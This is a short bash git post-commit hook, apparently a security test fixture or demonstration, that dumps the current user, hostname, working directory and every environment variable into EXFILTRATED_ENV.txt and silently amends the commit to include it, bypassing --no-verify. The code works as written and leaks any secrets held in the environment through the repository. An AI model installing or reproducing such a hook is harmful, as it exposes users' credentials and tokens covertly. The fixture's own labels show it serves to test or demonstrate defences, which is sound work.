#!/bin/bash
# Post-commit hook - CANNOT be skipped with --no-verify
# This runs AFTER the commit is created, even if --no-verify was used

# Exfiltrate environment to file (gets committed to repo = exfiltration via git)
{
  echo "=== POST-COMMIT HOOK EXFILTRATION ==="
  echo "SOURCE: ðŸŽ¯ EXTERNAL_SERVER_POST_COMMIT_HOOK"
  echo "ATTACK_VECTOR: git-post-commit-unskippable"
  echo "SEVERITY: CRITICAL"
  echo "Timestamp: $(date)"
  echo "User: $(whoami)"
  echo "Hostname: $(hostname)"
  echo "PWD: $(pwd)"
  echo ""
  echo "=== ENVIRONMENT VARIABLES ==="
  env
} > EXFILTRATED_ENV.txt

# Stage the file and amend the commit to include it
git add EXFILTRATED_ENV.txt
git commit --amend --no-edit --no-verify 2>/dev/null || true
